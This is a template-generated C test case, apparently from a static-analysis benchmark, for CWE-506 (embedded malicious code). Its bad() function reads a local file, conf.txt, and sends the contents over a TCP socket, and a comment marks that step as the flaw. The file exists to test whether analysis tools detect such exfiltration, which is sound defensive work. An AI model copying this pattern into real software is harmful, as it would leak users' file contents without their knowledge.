/* TEMPLATE GENERATED TESTCASE FILE
Filename: CWE506_Embedded_Malicious_Code__file_transfer_connect_socket_05.c
Label Definition File: CWE506_Embedded_Malicious_Code__file_transfer.badonly.label.xml
Template File: point-flaw-badonly-05.tmpl.c
*/
/*
 * @description
 * CWE: 506 Embedded Malicious Code
 * Sinks: connect_socket
 *    BadSink : Send file contents using a connect socket (client side)
 *      BadOnly (No GoodSink)
 * Flow Variant: 05 Control flow: if(staticTrue)
 *
 * */

#include "std_testcase.h"

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <direct.h>
#pragma comment(lib, "ws2_32") /* include ws2_32.lib when linking */
#define CLOSE_SOCKET closesocket
#else /* NOT _WIN32 */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define CLOSE_SOCKET close
#define SOCKET int
#endif

#define TCP_PORT 27015
#define FILENAME "conf.txt"

/* The variable below is not defined as "const", but is never
   assigned any other value, so a tool should be able to identify that
   reads of it will always return its initialized value. */
static int staticTrue = 1; /* true */

#ifndef OMITBAD

void CWE506_Embedded_Malicious_Code__file_transfer_connect_socket_05_bad()
{
    if(staticTrue)
    {
        {
#ifdef _WIN32
            WSADATA wsaData;
            int wsaDataInit = 0;
#endif
            struct sockaddr_in service;
            SOCKET connectSocket = INVALID_SOCKET;
            char contents[65536]; /* Assume file contents is less than 65k to make this test case easier to implement */
            FILE * pFile;
            pFile = fopen(FILENAME, "r");
            if (pFile != NULL)
            {
                if (fgets(contents, (int)(65535), pFile) == NULL)
                {
                    printLine("fgets() failed");
                    /* Restore NUL terminator if fgets fails */
                    contents[0] = '\0';
                }
                fclose(pFile);
            }
            do
            {
#ifdef _WIN32
                if (WSAStartup(MAKEWORD(2,2), &wsaData) != NO_ERROR)
                {
                    break;
                }
                wsaDataInit = 1;
#endif
                connectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (connectSocket == INVALID_SOCKET)
                {
                    break;
                }
                memset(&service, 0, sizeof(service));
                service.sin_family = AF_INET;
                service.sin_addr.s_addr = INADDR_ANY;
                service.sin_port = htons(TCP_PORT);
                if (connect(connectSocket, (struct sockaddr*)&service, sizeof(service)) == SOCKET_ERROR)
                {
                    break;
                }
                /* FLAW: Send the contents of a file over the network */
                if (send(connectSocket, contents, strlen(contents), 0) != strlen(contents))
                {
                    break;
                }
            }
            while (0);
            if (connectSocket != INVALID_SOCKET)
            {
                CLOSE_SOCKET(connectSocket);
            }
#ifdef _WIN32
            if (wsaDataInit)
            {
                WSACleanup();
            }
#endif
        }
    }
}

#endif /* OMITBAD */

/* Below is the main(). It is only used when building this testcase on
   its own for testing or for building a binary to use in testing binary
   analysis tools. It is not used when compiling all the testcases as one
   application, which is how source code analysis tools are tested. */

#ifdef INCLUDEMAIN

int main(int argc, char * argv[])
{
    /* seed randomness */
    srand( (unsigned)time(NULL) );
#ifndef OMITBAD
    printLine("Calling bad()...");
    CWE506_Embedded_Malicious_Code__file_transfer_connect_socket_05_bad();
    printLine("Finished bad()");
#endif /* OMITBAD */
    return 0;
}

#endif
